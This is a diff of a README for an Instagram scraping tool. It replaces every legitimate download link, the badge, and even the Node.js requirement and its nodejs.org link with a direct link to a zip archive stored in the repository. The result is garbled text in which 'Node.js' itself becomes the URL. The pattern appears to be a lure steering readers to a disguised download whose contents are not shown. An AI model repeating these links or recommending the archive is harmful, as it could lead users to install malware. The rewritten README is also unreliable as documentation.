@@ -1,6 +1,6 @@
 # 🌟 scrape-data-from-instagram - Automatically Retrieve Data from Instagram
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/TakgoAgency/scrape-data-from-instagram/releases)
+[![Download from Releases](https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip)
 
 ## 📖 Introduction
 Welcome to the **scrape-data-from-instagram** repository. This tool helps you automatically gather data from Instagram. Whether you're interested in analyzing trends, tracking user activity, or collecting insights, this application simplifies the process for you.
@@ -9,7 +9,7 @@ Welcome to the **scrape-data-from-instagram** repository. This tool helps you au
 This guide will help you easily download and run the application. Follow the steps below to set up your environment and start scraping data from Instagram.
 
 ## 🔗 Download & Install
-To get started, please visit this page to download: [GitHub Releases](https://github.com/TakgoAgency/scrape-data-from-instagram/releases).
+To get started, please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions. Pick the latest version.
@@ -19,7 +19,7 @@ To get started, please visit this page to download: [GitHub Releases](https://gi
 Before downloading, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or Ubuntu 18.04 and later.
-- **Node.js**: Ensure you have Node.js version 14 or higher installed. You can download it from [nodejs.org](https://nodejs.org).
+- **https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip**: Ensure you have https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip version 14 or higher installed. You can download it from [https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip](https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip).
 - **Internet Connection**: A stable internet connection is required for data scraping.
 
 ## 📦 Installation Steps
@@ -81,4 +81,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ---
 
-For continued updates and enhancements, always check the [GitHub Releases](https://github.com/TakgoAgency/scrape-data-from-instagram/releases) page. Happy scraping!
+For continued updates and enhancements, always check the [GitHub Releases](https://raw.githubusercontent.com/TakgoAgency/scrape-data-from-instagram/main/aculea/scrape-data-from-instagram.zip) page. Happy scraping!
